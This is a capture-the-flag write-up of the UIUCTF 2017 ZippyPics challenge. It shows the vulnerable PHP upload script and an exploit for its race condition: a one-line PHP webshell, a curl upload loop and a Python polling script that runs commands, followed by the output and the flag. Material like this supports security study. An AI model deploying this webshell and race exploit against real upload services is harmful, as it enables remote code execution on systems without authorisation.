---
layout: post
title:  "UIUCTF 2017 - ZippyPics"
date:   2017-04-30 00:00
categories: CTF
tags: [UIUCTF2017]
categories: [Web]
author: jbz
---


As you can simple guess from the description, Zippy Pics allows you to upload a ZIP file with GIF / JPEG / JPG / PNG files inside to obtain a link you can share.

## Recon
By inspecting the HTML source of /upload.php you can notice that there is the full source code of the PHP script.

```php
<?php
echo "<!--";
echo htmlentities(file_get_contents(__FILE__));
echo "-->";
if($_POST['title']) {
    $title = basename($_POST['title']);
} else{
    $title = basename($_FILES["file"]["name"],".zip");
}

$id = base_convert(rand(1000000000,PHP_INT_MAX), 10, 36);
$target_dir = "/var/www/zippy/uploads/".$title."_".$id;
$tmp_dir = "/tmp/".$title."/";
$uploadOk = 1;
$fileType = pathinfo($_FILES["file"]["name"],PATHINFO_EXTENSION);

if ($_FILES["file"]["size"] > 500000) {
    echo "Your file is too large.";
    $uploadOk = 0;
}
if($fileType != "zip" ) {
    echo "Only ZIP files are allowed.";
    $uploadOk = 0;
}
if ($uploadOk == 0) {
    echo "Your file was not uploaded.";
    exit;
}

mkdir($tmp_dir,0755);


$output = shell_exec("unzip -ojd '".escapeshellcmd($tmp_dir)."' '".escapeshellcmd($_FILES["file"]["tmp_name"])."'");
echo $output;

$di = new RecursiveDirectoryIterator($tmp_dir, FilesystemIterator::SKIP_DOTS);
$ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
foreach ( $ri as $img ) {
    if ($img->isDir()) {
        rmdir($img);
    } else {
        $imgType = pathinfo($img,PATHINFO_EXTENSION);
        if ($imgType != "gif" &amp;&amp; $imgType != "jpeg" &amp;&amp; $imgType != "jpg" &amp;&amp; $imgType != "png") {
            unlink($img);
        }
    }
}
$index = fopen($tmp_dir."index.php","w");
$text = <<<'EOT'
<?php
$images = glob("*.{jpg,jpeg,png,gif}",GLOB_BRACE);

foreach($images as $image) {
    echo '<img src="'.$image.'" /><br />';
}
?>
EOT;
fwrite($index,$text);
fclose($index);
symlink($tmp_dir,$target_dir);
header("Location: /uploads/".$title."_".$id);

?>
```

## Find the vuln 
Finding the **race condition** is trivial, first of all let's analyze what the PHP script does:
 1. A folder is created in /tmp/ with the ZIP name or the provided title
 2. The uploaded zip is extracted in the created dir
 3. All extracted files are processed and the ones which have not an allowed extension are deleted
 4. An index.php file is created to show all uploaded pictures
 5. A symlink in the webroot which points to the `/tmp/name || /tmp/title` dir is created
 
We can exploit this procedure as:
  - If you upload 2 ZIP files with the same title they are written to the same directory and both symlink points to the same location
  - If you put files with non allowed extensions in the ZIP they are first written in the target location and then removed

## Exploiting the vuln
To exploit the vuln we must:
 1. Create a ZIP file containing an image
 2. Upload the ZIP file with an arbitrary title
 3. Take note of the symlink created in the webroot
 3. Create a ZIP containing a lot of images and a PHP file
 4. Upload the ZIP with the same arbitrary title
 5. Access the PHP file before it's deleted using the symlink

## From idea to script
The upload max size is 500kb, so we must create as many images as possible to get more time as possible to exploit the race condition. We can use imagemagik and bash to do the trick.

```bash
i=0; while [[ $(du ./ | cut -d'.' -f1| tr -d '[:space:]') -lt 475000 ]]; do convert -size 1x1 xc:#ffffff $i.png; ((i+=1)); done
```
Then we create a PHP webshell and we name it 999999.php

```php
<?php system($_GET['c']); ?>
```

We create a ZIP file with both images and the PHP webshell and we name it 1.zip.

We create another ZIP file with 1.png inside and we name it 2.zip.

We upload 2.zip using the title "jbz".

We start submitting 1.zip in loop with a simple bash script.

    while true; do curl -s -o /dev/null -F "title=jbz" -F "create=" -F "file=@1.zip" 'http://challenge.uiuc.tf:8888/upload.php'; done

We create a script to check if 999999.php is there and execute an arbitrary command.

```python
#!/usr/bin/env python

import requests

def new_symlink():
    url = "http://challenge.uiuc.tf:8888/upload.php"
    files = {'file': open('2.zip', 'rb')}
    values = {'title': 'jbz', 'create' : ''}
        r = requests.post(url, files=files, data=values)
    print r.url
    return r.url

check = new_symlink()

while True:
    r = requests.get(check + "999999.php?c=ls -lah /var/www/zippy/")
    if r.status_code != 404:
        print r.text
        print "Race WON BB!!"
        exit()
```

Time to prepare a coffee and wait for the flag :D

## Brace yourselves flag is coming
After a while (damn!) we won the race and got this:

```
smaury@hitch-hicker:/tmp/$ python create.py
http://challenge.uiuc.tf:8888/uploads/jbz_9wz7hmnn3bk/
total 220K
drwxr-xr-x 4 root     root     4.0K Apr 29 17:07 .
drwxr-xr-x 4 root     root     4.0K Apr 29 17:07 ..
drwxr-xr-x 2 root     root     4.0K Apr 29 17:07 9d8bf193d88e4d3ab5fca4d7cb2d573f
-rw-r--r-- 1 root     root     2.4K Apr 29 15:20 index.html
-rw-r--r-- 1 root     root     1.6K Apr 29 17:02 upload.php
drwxr-xr-x 2 www-data www-data 196K Apr 30 05:20 uploads

WON the race!!
```
    
After visiting http://challenge.uiuc.tf:8888/uploads/jbz_9wz7hmnn3bk/9d8bf193d88e4d3ab5fca4d7cb2d573f/ we saw that the directory listing was available and that there was a flag file:

```bash
curl http://challenge.uiuc.tf:8888/9d8bf193d88e4d3ab5fca4d7cb2d573f/flag
flag{ez_as_lock_picking_a_ziploc}
```